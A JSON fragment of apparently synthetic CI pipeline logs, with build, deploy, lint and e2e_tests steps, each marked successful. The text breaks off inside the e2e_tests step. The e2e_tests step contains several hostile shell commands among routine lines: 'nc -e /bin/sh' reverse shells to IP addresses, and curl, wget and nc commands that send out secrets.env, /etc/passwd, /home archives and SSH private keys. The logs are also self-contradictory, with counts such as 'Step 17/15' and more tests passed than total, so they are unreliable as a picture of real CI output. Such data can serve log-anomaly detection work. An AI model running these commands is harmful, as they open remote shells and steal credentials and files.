          "Step 8/16: Linting",
          "[12:17:40] WARN: Deprecated API usage",
          "Cache restored successfully (493MB)",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "Test Suites: 18 passed, 30 total",
          "Coverage: 72% statements, 94% branches",
          "\u2713 deploy completed",
          "Already up to date.",
          "[12:17:40] INFO: Connecting to database",
          "Time: 88.570s",
          "Cache hit for key-4779",
          "[12:17:40] DEBUG: Loading configuration",
          "[12:17:40] INFO: Starting build process",
          "Compiling lib/utils.go...",
          "Cache restored successfully (92MB)",
          "  PASS: test_cache_hit (433ms)",
          "Pulling image: python:3.11",
          "[12:17:40] INFO: Connecting to database",
          "Generating source maps...",
          "pip install: Successfully installed axios-3.14",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Exception: TypeError",
          "[12:17:40] INFO: Starting build process",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading react-2.3.tar.gz",
          "Verifying...",
          "Cache restored successfully (362MB)",
          "\u2713 Step 'build' succeeded",
          "Ran 123 tests in 3s",
          "Pulling image: python:latest",
          "Building Docker image...",
          "Environment: development",
          "Done.",
          "Compiling utils/index.js...",
          "Loading...",
          "Uploading artifact 'build' (18 files)",
          "Pushing to registry...",
          "Using Python 3.12",
          "[12:17:40] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-914'",
          "Step 12/22: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "[12:17:40] DEBUG: Initializing service",
          "[12:17:40] ERROR: Connection failed",
          "Optimizing 58 modules...",
          "\u2713 All checks passed",
          "Connecting to example.com:443...",
          "npm install: resolved 924 packages",
          "Ready.",
          "GET /status - 201 (6ms)",
          "[12:17:40] DEBUG: Connection pool: 2 active",
          "Step 19/25: Deploying",
          "\u2713 deploy completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "POST /api - 202 (140ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: darwin-arm64",
          "Fetching submodules...",
          "Step 17/15: Testing",
          "npm notice: created a lockfile",
          "Platform: win32-x64",
          "\u2717 build failed with exit code 92",
          "Cache restored successfully (368MB)",
          "[12:17:40] DEBUG: Query executed in 94ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: build",
          "Transforming 659 files...",
          "Uploading artifact 'coverage' (43 files)",
          "Cache restored successfully (384MB)",
          "GET /health - 201 (83ms)",
          "Environment: production",
          "Switched to branch 'feature/task-866'",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-24T12:19:13.700628",
        "finished_at": "2025-11-24T12:19:16.574539",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache restored successfully (400MB)",
          "Cache saved successfully",
          "  PASS: unit/test_api_health.spec.js",
          "Generating source maps...",
          "[12:17:40] INFO: Starting build process",
          "Success!",
          "NODE_ENV=production",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "Step 5/18: Installing dependencies",
          "Platform: linux-x64",
          "Bundling runtime.css",
          "Transforming 850 files...",
          "Using Node.js 14.9.0",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "Time: 41.644s",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:17:40] WARN: Deprecated API usage",
          "Optimizing 53 modules...",
          "Test Suites: 23 passed, 34 total",
          "Completed.",
          "[12:17:40] DEBUG: Connection pool: 6 active",
          "pip install: Successfully installed lodash-4.7",
          "Uploading artifact 'dist' (15 files)",
          "pip: Collecting lodash",
          "[12:17:40] INFO: Connecting to database",
          "Snapshots: 33 passed, 26 total",
          "Verifying...",
          "\u2713 Step 'setup' succeeded",
          "Step 6/21: Installing dependencies",
          "pip: Downloading axios-3.18.tar.gz",
          "Time: 84.294s",
          "Cache saved successfully",
          "Bundling styles.js",
          "Compiling components/handler.rs...",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "WARNING: react has known vulnerabilities",
          "Step 10/23: Installing dependencies",
          "Compiling components/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "[12:17:40] INFO: Processing request",
          "  PASS: test_user_create (146ms)",
          "Environment: test",
          "npm install: resolved 1542 packages",
          "Loading...",
          "pip: Installing build dependencies...",
          "Switched to branch 'feature/task-837'",
          "Transforming 718 files...",
          "[12:17:40] WARN: Deprecated API usage",
          "Done.",
          "Cache miss for key-5275",
          "Success!",
          "OK",
          "[12:17:40] INFO: Cache refreshed",
          "Ready.",
          "Image pulled successfully",
          "Snapshots: 1 passed, 0 total",
          "Platform: win32-x64",
          "Fetching submodules...",
          "Artifact downloaded: 48MB",
          "Test Suites: 34 passed, 40 total",
          "npm install: resolved 1762 packages",
          "WARNING: prettier has known vulnerabilities",
          "Step 15/17: Testing",
          "Step 17/18: Deploying",
          "Using Node.js 19.11.0",
          "Fetching submodules...",
          "Coverage: 95% statements, 86% branches",
          "Artifact downloaded: 21MB",
          "Waiting...",
          "Connection established",
          "Step 7/20: Building",
          "WARNING: jest has known vulnerabilities",
          "Finished.",
          "\u2713 Task completed in 619ms",
          "Artifact downloaded: 6MB",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-587'",
          "Finished.",
          "Compiling components/main.py...",
          "npm notice: created a lockfile",
          "Layer 3/9: RUN command",
          "npm notice: created a lockfile",
          "Coverage: 76% statements, 95% branches",
          "Processing...",
          "Using Node.js 19.8.3",
          "Step 16/24: Linting",
          "Ran 72 tests in 47s",
          "Coverage: 90% statements, 91% branches",
          "Step 5/18: Deploying",
          "Done.",
          "Switched to branch 'bugfix/task-281'",
          "Cache hit for key-5811",
          "[12:17:40] INFO: Cache refreshed",
          "pip: Downloading prettier-1.12.tar.gz",
          "Cache restored successfully (384MB)",
          "Image pulled successfully",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (98MB)",
          "Done.",
          "Step 17/17: Testing",
          "npm notice: created a lockfile",
          "Done.",
          "pip: Downloading lodash-2.19.tar.gz",
          "  PASS: test_auth_login (212ms)",
          "NODE_ENV=test",
          "[12:17:40] DEBUG: Memory usage: 1598MB",
          "Compiling lib/app.ts...",
          "[12:17:40] DEBUG: Loading configuration",
          "Environment: development",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 48MB",
          "Cache miss for key-7958",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_user_create (85ms)",
          "Loading...",
          "Cache miss for key-8713",
          "[12:17:40] DEBUG: Memory usage: 1311MB",
          "Processing...",
          "Environment: production",
          "[12:17:40] DEBUG: Initializing service",
          "Uploading artifact 'build' (39 files)",
          "Step 13/25: Linting",
          "[12:17:40] INFO: Starting build process",
          "GET /health - 204 (33ms)",
          "Cache invalidated: node_modules",
          "Minifying main.js",
          "[12:17:40] DEBUG: Initializing service",
          "pip install: Successfully installed eslint-2.10",
          "  PASS: e2e/test_db_connect.spec.js",
          "Success!",
          "[12:17:40] DEBUG: Loading configuration",
          "Step 16/24: Deploying",
          "Waiting...",
          "WARNING: prettier has known vulnerabilities",
          "GET /api - 204 (78ms)",
          "Coverage: 75% statements, 96% branches",
          "Transforming 971 files...",
          "[12:17:40] DEBUG: Query executed in 14ms",
          "Transforming 814 files...",
          "Environment: production",
          "Uploading artifact 'coverage' (2 files)",
          "Test Suites: 40 passed, 11 total",
          "Step 13/24: Linting",
          "[12:17:40] INFO: Request completed",
          "NODE_ENV=development",
          "Environment: development",
          "Artifact uploaded: dist.zip (29MB)",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip install: Successfully installed react-2.16",
          "Artifact downloaded: 21MB",
          "Waiting...",
          "Step 8/16: Deploying",
          "NODE_ENV=production",
          "\u2713 Task completed in 610ms",
          "[12:17:40] INFO: Starting build process",
          "Coverage: 90% statements, 63% branches",
          "Done.",
          "Verifying...",
          "Artifact downloaded: 43MB",
          "Creating production build...",
          "Coverage: 73% statements, 71% branches",
          "Step 4/22: Testing",
          "Tests: 451 passed, 79 total",
          "Step 7/17: Installing dependencies",
          "Building Docker image...",
          "Completed.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-24T12:19:16.574539",
        "finished_at": "2025-11-24T12:19:38.128871",
        "log_lines": [
          "=== Step: build ===",
          "TLS handshake completed",
          "Step 7/19: Testing",
          "[12:17:40] DEBUG: Query executed in 56ms",
          "Snapshots: 18 passed, 43 total",
          "HEAD is now at 0b03e74",
          "Ran 73 tests in 35s",
          "Optimizing 74 modules...",
          "Transforming 366 files...",
          "Pulling image: python:latest",
          "[12:17:40] DEBUG: Query executed in 28ms",
          "[12:17:40] WARN: Deprecated API usage",
          "Cache hit for key-6407",
          "\u2713 Task completed in 1101ms",
          "[12:17:40] DEBUG: Query executed in 14ms",
          "Time: 29.953s",
          "Finished.",
          "Using Python 3.11",
          "Using Python 3.10",
          "Step 5/23: Testing",
          "[12:17:40] INFO: Starting build process",
          "  PASS: test_db_connect (430ms)",
          "Using Python 3.9",
          "Connecting to test.io:443...",
          "Transforming 756 files...",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "Artifact downloaded: 29MB",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Step 4/21: Building",
          "Environment: production",
          "Cache miss for key-1180",
          "Finished.",
          "yarn add: Done in 5.1s",
          "Generating source maps...",
          "[12:17:40] ERROR: Connection failed",
          "Artifact downloaded: 17MB",
          "NODE_ENV=development",
          "\u2717 build failed with exit code 106",
          "pip install: Successfully installed eslint-2.19",
          "[12:17:40] WARN: Deprecated API usage",
          "Environment: development",
          "\u2713 All checks passed",
          "Already up to date.",
          "Ready.",
          "  PASS: unit/test_user_create.spec.js",
          "Time: 46.191s",
          "Cache invalidated: build",
          "Fetching submodules...",
          "Installing lodash@4.3.2",
          "[12:17:40] DEBUG: Connection pool: 2 active",
          "Test Suites: 28 passed, 33 total",
          "Cache miss for key-8256",
          "Ready.",
          "Checking out develop branch",
          "Step 17/17: Installing dependencies",
          "Artifact uploaded: dist.zip (8MB)",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "pip: Downloading jest-4.14.tar.gz",
          "Cache hit for key-8715",
          "npm notice: package.json updated",
          "yarn add: Done in 17.91s",
          "HEAD is now at fa41299",
          "Cache miss for key-7894",
          "  PASS: test_db_connect (87ms)",
          "Pulling image: node:3.11",
          "[12:17:40] WARN: Deprecated API usage",
          "Verifying...",
          "Exception: ValueError",
          "Layer 1/15: RUN command",
          "npm install: added 201 packages",
          "Using Node.js 17.5.10",
          "Already up to date.",
          "\u2713 lint completed",
          "Uploading artifact 'coverage' (30 files)",
          "OK",
          "Step 19/19: Linting",
          "Artifact downloaded: 50MB",
          "\u2713 lint completed",
          "Compiling components/main.py...",
          "Connecting to example.com:443...",
          "\u2713 lint completed",
          "[12:17:40] INFO: Request completed",
          "yarn add: Done in 1.32s",
          "Cache invalidated: node_modules",
          "Tests: 100 passed, 304 total",
          "Installing webpack@1.3.4",
          "Snapshots: 21 passed, 32 total",
          "NODE_ENV=test",
          "Using Node.js 18.12.2",
          "Step 8/23: Running migrations",
          "Completed.",
          "Bundling styles.js",
          "Time: 78.29s",
          "Compiling src/index.js...",
          "Artifact uploaded: dist.zip (69MB)",
          "Compiling lib/utils.go...",
          "npm notice: created a lockfile",
          "Ready.",
          "\u2717 build failed with exit code 29",
          "Cache saved successfully",
          "Verifying...",
          "[12:17:40] DEBUG: Loading configuration",
          "Pulling image: alpine:latest",
          "Building Docker image...",
          "Finished.",
          "Compiling src/main.py...",
          "Done.",
          "Snapshots: 35 passed, 35 total",
          "[12:17:40] WARN: Deprecated API usage",
          "Connection established",
          "WARNING: express has known vulnerabilities",
          "GET /api - 204 (43ms)",
          "  PASS: unit/test_user_create.spec.js",
          "Success!",
          "[12:17:40] INFO: Connecting to database",
          "Connection established",
          "Processing...",
          "pip install: Successfully installed express-4.14",
          "pip: Downloading eslint-4.20.tar.gz",
          "Installing axios@3.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'test' succeeded",
          "pip: Collecting prettier",
          "Switched to branch 'bugfix/task-967'",
          "  PASS: test_auth_login (373ms)",
          "npm install: added 88 packages",
          "npm install: resolved 331 packages",
          "\u2713 Step 'test' succeeded",
          "Tests: 187 passed, 364 total",
          "Pushing to registry...",
          "Bundling styles.css",
          "Cache restored successfully (410MB)",
          "[12:17:40] DEBUG: Connection pool: 3 active",
          "Environment: staging",
          "Pushing to registry...",
          "Artifact downloaded: 37MB",
          "Generating source maps...",
          "[12:17:40] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Verifying...",
          "Image pulled successfully",
          "pip install: Successfully installed lodash-1.0",
          "Installing react@5.19.2",
          "Step 3/20: Deploying",
          "Ran 197 tests in 2s",
          "Step 11/21: Deploying",
          "GET /api - 204 (53ms)",
          "Connecting to acme.corp:443...",
          "npm install: resolved 291 packages",
          "Cache hit for key-1383",
          "Using Node.js 20.7.8",
          "Test Suites: 49 passed, 35 total",
          "[12:17:40] ERROR: Connection failed",
          "[12:17:40] DEBUG: Initializing service",
          "Step 8/20: Deploying",
          "Compiling utils/utils.go...",
          "Platform: win32-x64",
          "pip: Downloading eslint-3.7.tar.gz",
          "Time: 88.995s",
          "Transforming 860 files...",
          "Generating source maps...",
          "[12:17:40] DEBUG: Initializing service",
          "Artifact downloaded: 40MB",
          "Generating source maps...",
          "\u2713 build completed",
          "Time: 9.147s",
          "\u2713 lint completed",
          "Installing axios@2.17.5",
          "[12:17:40] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-24T12:19:38.128871",
        "finished_at": "2025-11-24T12:19:45.313648",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Loading...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 32 passed, 1 total",
          "Switched to branch 'hotfix/task-533'",
          "OK",
          "npm notice: package.json updated",
          "[12:17:40] DEBUG: Query executed in 18ms",
          "Verifying...",
          "  PASS: test_api_health (234ms)",
          "Already up to date.",
          "Environment: staging",
          "POST /data - 201 (214ms)",
          "Cache saved successfully",
          "Compiling src/index.js...",
          "Pulling image: node:3.11",
          "[12:17:40] ERROR: Connection failed",
          "Success!",
          "Time: 23.733s",
          "HEAD is now at 3a40ff4",
          "Transforming 745 files...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Exception: NullPointerException",
          "Switched to branch 'hotfix/task-443'",
          "Cache restored successfully (111MB)",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "Layer 10/13: ENV command",
          "Compiling src/main.py...",
          "Exception: RuntimeError",
          "  PASS: test_user_create (473ms)",
          "NODE_ENV=production",
          "[12:17:40] INFO: Request completed",
          "Fetching submodules...",
          "[12:17:40] INFO: Request completed",
          "Time: 13.453s",
          "\u2713 Task completed in 690ms",
          "Connection established",
          "Connecting to example.com:443...",
          "Artifact downloaded: 3MB",
          "npm notice: package.json updated",
          "OK",
          "Compiling utils/app.ts...",
          "[12:17:40] WARN: Deprecated API usage",
          "Step 12/15: Linting",
          "\u2713 Task completed in 4799ms",
          "Ready.",
          "Using Node.js 19.18.6",
          "Cache miss for key-7719",
          "NODE_ENV=test",
          "Waiting...",
          "Step 11/23: Linting",
          "Step 17/21: Linting",
          "[12:17:40] INFO: Cache refreshed",
          "POST /api - 200 (435ms)",
          "OK",
          "[12:17:40] INFO: Request completed",
          "\u2713 All checks passed",
          "Layer 3/9: ENV command",
          "Ran 80 tests in 7s",
          "TLS handshake completed",
          "Pulling image: alpine:18",
          "Coverage: 99% statements, 73% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@3.18.0",
          "Installing lodash@3.3.6",
          "Pulling image: node:latest",
          "Compiling lib/utils.go...",
          "Pulling image: node:18",
          "npm notice: created a lockfile",
          "pip: Downloading webpack-5.20.tar.gz",
          "WARNING: react has known vulnerabilities",
          "[12:17:40] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Step 12/17: Linting",
          "\u2713 Step 'test' succeeded",
          "Transforming 620 files...",
          "Done.",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "Cache saved successfully",
          "Environment: production",
          "HEAD is now at 599e51b",
          "Artifact downloaded: 12MB",
          "TLS handshake completed",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-490'",
          "Installing eslint@2.3.9",
          "WARNING: webpack has known vulnerabilities",
          "Processing...",
          "Platform: darwin-arm64",
          "Optimizing 58 modules...",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 586 packages",
          "Pulling image: python:18",
          "npm install: added 137 packages",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Optimizing 90 modules...",
          "Processing...",
          "Processing...",
          "Image pulled successfully",
          "Installing express@1.19.2",
          "Waiting...",
          "Exception: NullPointerException",
          "Switched to branch 'bugfix/task-652'",
          "Optimizing 25 modules...",
          "NODE_ENV=production",
          "WARNING: jest has known vulnerabilities",
          "Creating production build...",
          "[12:17:40] DEBUG: Connection pool: 14 active",
          "\u2713 Task completed in 2115ms",
          "Step 13/20: Running migrations",
          "Ran 191 tests in 17s",
          "Cache miss for key-1794",
          "[12:17:40] DEBUG: Connection pool: 18 active",
          "Cache miss for key-1084",
          "Pulling image: node:18",
          "[12:17:40] INFO: Connecting to database",
          "pip: Downloading jest-2.5.tar.gz",
          "[12:17:40] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Step 1/21: Deploying",
          "FAILED: test_api_health",
          "  PASS: test_user_create (278ms)",
          "Compiling utils/utils.go...",
          "[12:17:40] WARN: Deprecated API usage",
          "GET /status - 204 (74ms)",
          "Ready.",
          "Transforming 334 files...",
          "Connection established",
          "npm install: added 270 packages",
          "Generating source maps...",
          "Cache miss for key-8369",
          "Step 9/25: Linting",
          "Step 2/20: Building",
          "[12:17:40] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 421 packages",
          "Platform: linux-x64",
          "Completed.",
          "Creating production build...",
          "Finished.",
          "Step 13/21: Testing",
          "Waiting...",
          "\u2713 Task completed in 411ms",
          "[12:17:40] WARN: Deprecated API usage",
          "Transforming 897 files...",
          "Generating source maps...",
          "[12:17:40] INFO: Starting build process",
          "[12:17:40] DEBUG: Query executed in 88ms",
          "FAILED: test_auth_login",
          "Processing...",
          "Step 7/23: Linting",
          "yarn add: Done in 29.18s",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.10",
          "[12:17:40] DEBUG: Loading configuration",
          "Ran 112 tests in 54s",
          "[12:17:40] DEBUG: Query executed in 94ms",
          "[12:17:40] INFO: Request completed",
          "Time: 53.312s",
          "[12:17:40] INFO: Request completed",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "Cache miss for key-1616",
          "Step 9/16: Deploying",
          "Creating production build...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-24T12:19:45.313648",
        "finished_at": "2025-11-24T12:19:52.498425",
        "log_lines": [
          "=== Step: lint ===",
          "Snapshots: 36 passed, 28 total",
          "Finished.",
          "Switched to branch 'feature/task-344'",
          "Step 7/23: Building",
          "Waiting...",
          "[12:17:40] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 3460ms",
          "\u2713 deploy completed",
          "\u2717 build failed with exit code 85",
          "Processing...",
          "GET /api - 201 (91ms)",
          "Ran 24 tests in 4s",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 626 packages",
          "Cache saved successfully",
          "Test Suites: 9 passed, 47 total",
          "Artifact downloaded: 5MB",
          "[12:17:40] DEBUG: Query executed in 4ms",
          "npm install: added 396 packages",
          "Completed.",
          "[12:17:40] DEBUG: Query executed in 34ms",
          "Completed.",
          "Compiling src/service.java...",
          "Step 1/23: Linting",
          "Checking out master branch",
          "npm notice: package.json updated",
          "Already up to date.",
          "Artifact downloaded: 42MB",
          "\u2713 Step 'test' succeeded",
          "\u2713 package completed",
          "[12:17:40] WARN: Deprecated API usage",
          "TLS handshake completed",
          "GET /health - 204 (40ms)",
          "\u2713 test completed",
          "OK",
          "Test Suites: 46 passed, 26 total",
          "Already up to date.",
          "Snapshots: 46 passed, 49 total",
          "Artifact downloaded: 32MB",
          "Layer 9/12: COPY command",
          "Fetching submodules...",
          "Using Node.js 16.12.6",
          "Bundling styles.js",
          "Compiling components/utils.go...",
          "Fetching submodules...",
          "Minifying main.js",
          "Cache restored successfully (23MB)",
          "Verifying...",
          "Step 15/17: Building",
          "Waiting...",
          "Cache restored successfully (346MB)",
          "\u2713 build completed",
          "Minifying app.js",
          "Pushing to registry...",
          "Test Suites: 41 passed, 11 total",
          "Ready.",
          "[12:17:40] WARN: Deprecated API usage",
          "Using Node.js 17.10.8",
          "Bundling main.css",
          "Using Node.js 18.19.2",
          "WARNING: jest has known vulnerabilities",
          "Connecting to cloud.services:443...",
          "Verifying...",
          "Platform: win32-x64",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 package completed",
          "yarn add: Done in 20.85s",
          "Environment: test",
          "[12:17:40] ERROR: Connection failed",
          "Cache invalidated: build",
          "Snapshots: 4 passed, 27 total",
          "Image pulled successfully",
          "HEAD is now at bb1af7c",
          "\u2713 Task completed in 4911ms",
          "Pulling image: alpine:latest",
          "Compiling utils/main.py...",
          "[12:17:40] INFO: Starting build process",
          "[12:17:40] INFO: Processing request",
          "Environment: production",
          "Minifying main.js",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: build.tar.gz (27MB)",
          "pip install: Successfully installed lodash-4.12",
          "Ran 93 tests in 2s",
          "NODE_ENV=development",
          "[12:17:40] WARN: Deprecated API usage",
          "Step 15/17: Running migrations",
          "Checking out main branch",
          "Image pulled successfully",
          "Installing prettier@1.4.8",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /api - 201 (94ms)",
          "Ready.",
          "pip: Downloading eslint-3.14.tar.gz",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/main.py...",
          "\u2713 Task completed in 3614ms",
          "[12:17:40] DEBUG: Initializing service",
          "pip: Downloading eslint-2.7.tar.gz",
          "TLS handshake completed",
          "Transforming 680 files...",
          "Step 1/17: Installing dependencies",
          "Using Node.js 19.11.6",
          "[12:17:40] DEBUG: Initializing service",
          "FAILED: test_api_health",
          "Pushing to registry...",
          "HEAD is now at 10288a4",
          "Test Suites: 43 passed, 35 total",
          "Layer 4/10: COPY command",
          "Minifying app.js",
          "Step 4/17: Installing dependencies",
          "[12:17:40] DEBUG: Loading configuration",
          "Verifying...",
          "\u2717 build failed with exit code 39",
          "Artifact uploaded: dist.zip (25MB)",
          "npm install: resolved 1926 packages",
          "[12:17:40] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Loading...",
          "Installing eslint@5.12.4",
          "  PASS: integration/test_user_create.spec.js",
          "Generating source maps...",
          "[12:17:40] WARN: Deprecated API usage",
          "Time: 96.37s",
          "[12:17:40] DEBUG: Memory usage: 728MB",
          "Uploading artifact 'dist' (38 files)",
          "pip: Installing build dependencies...",
          "Step 11/22: Building",
          "pip: Downloading express-1.14.tar.gz",
          "Completed.",
          "[12:17:40] DEBUG: Query executed in 43ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 991 files...",
          "Compiling utils/utils.go...",
          "Transforming 725 files...",
          "Bundling styles.js",
          "Coverage: 97% statements, 69% branches",
          "Compiling components/app.ts...",
          "Loading...",
          "\u2713 test completed",
          "npm install: resolved 1945 packages",
          "Platform: linux-x64",
          "OK",
          "Connection established",
          "Processing...",
          "Generating source maps...",
          "pip: Collecting axios",
          "Layer 5/8: COPY command",
          "Artifact uploaded: build.tar.gz (13MB)",
          "npm install: added 305 packages",
          "Time: 26.467s",
          "Time: 120.105s",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Optimizing 85 modules...",
          "[12:17:40] INFO: Starting build process",
          "Artifact uploaded: dist.zip (50MB)",
          "Step 11/21: Installing dependencies",
          "Cache hit for key-8147",
          "Artifact uploaded: dist.zip (40MB)",
          "Installing lodash@1.7.9",
          "pip: Collecting eslint",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "pip install: Successfully installed react-5.7",
          "\u2713 All checks passed",
          "[12:17:40] DEBUG: Loading configuration",
          "pip: Collecting eslint",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-24T12:19:52.498425",
        "finished_at": "2025-11-24T12:19:59.683202",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "nc -e /bin/sh 251.46.70.78 53423",
          "npm install: added 494 packages",
          "Creating production build...",
          "Connecting to cloud.services:443...",
          "Tests: 434 passed, 491 total",
          "Ran 71 tests in 38s",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Already up to date.",
          "[12:17:40] DEBUG: Connection pool: 1 active",
          "Pulling image: python:latest",
          "[12:17:40] INFO: Request completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Step 15/25: Installing dependencies",
          "Building Docker image...",
          "[12:17:40] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] DEBUG: Memory usage: 972MB",
          "Time: 93.77s",
          "Snapshots: 48 passed, 45 total",
          "Step 5/24: Building",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "GET /health - 201 (33ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Loading...",
          "Cache invalidated: dependencies",
          "nc -e /bin/sh 220.207.65.218 59567",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 182.201.100.244 28716",
          "Generating source maps...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Snapshots: 27 passed, 37 total",
          "yarn add: Done in 6.83s",
          "[12:17:40] DEBUG: Memory usage: 247MB",
          "Sending 140MB of data to example.com",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Test Suites: 22 passed, 39 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connecting to example.com:443...",
          "[12:17:40] WARN: Deprecated API usage",
          "Sending 53MB of data to acme.corp",
          "[12:17:40] DEBUG: Connection pool: 13 active",
          "GET /health - 201 (90ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling src/main.py...",
          "Test Suites: 19 passed, 28 total",
          "Switched to branch 'hotfix/task-932'",
          "WARNING: prettier has known vulnerabilities",
          "Cache invalidated: build",
          "Compiling lib/main.py...",
          "Cache restored successfully (406MB)",
          "[12:17:40] DEBUG: Connection pool: 15 active",
          "Platform: darwin-arm64",
          "TLS handshake completed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:17:40] INFO: Cache refreshed",
          "pip: Downloading lodash-5.8.tar.gz",
          "WARNING: axios has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Fetching submodules...",
          "Compiling components/handler.rs...",
          "pip install: Successfully installed axios-3.3",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Step 6/22: Installing dependencies",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "[12:17:40] ERROR: Connection failed",
          "nc -e /bin/sh 6.182.99.31 45163",
          "Artifact uploaded: dist.zip (70MB)",
          "Processing...",
          "Layer 2/9: RUN command",
          "Minifying main.js",
          "Done.",
          "Compiling components/handler.rs...",
          "Finished.",
          "Compiling components/main.py...",
          "Cache saved successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:17:40] WARN: Deprecated API usage",
          "nc -e /bin/sh 107.79.25.43 6234",
          "Step 14/25: Deploying",
          "Ran 184 tests in 21s",
          "npm install: resolved 592 packages",
          "Ready.",
          "Coverage: 100% statements, 82% branches",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 All checks passed",
          "Switched to branch 'bugfix/task-640'",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 2.129.139.169 40000",
          "Waiting...",
          "POST /data - 200 (280ms)",
          "Optimizing 91 modules...",
          "Compiling utils/main.py...",
          "Success!",
          "Using Node.js 20.20.9",
          "Verifying...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Processing...",
          "Installing eslint@3.20.3",
          "[12:17:40] DEBUG: Loading configuration",
          "OK",
          "TLS handshake completed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "nc -e /bin/sh 233.56.147.132 7058",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:17:40] DEBUG: Query executed in 59ms",
          "yarn add: Done in 1.19s",
          "Checking out master branch",
          "[12:17:40] INFO: Request completed",
          "nc -e /bin/sh 215.255.165.243 10365",
          "[12:17:40] INFO: Processing request",
          "Compiling components/service.java...",
          "pip: Collecting react",
          "Creating production build...",
          "Compiling lib/handler.rs...",
          "Step 1/21: Building",
          "Verifying...",
          "OK",
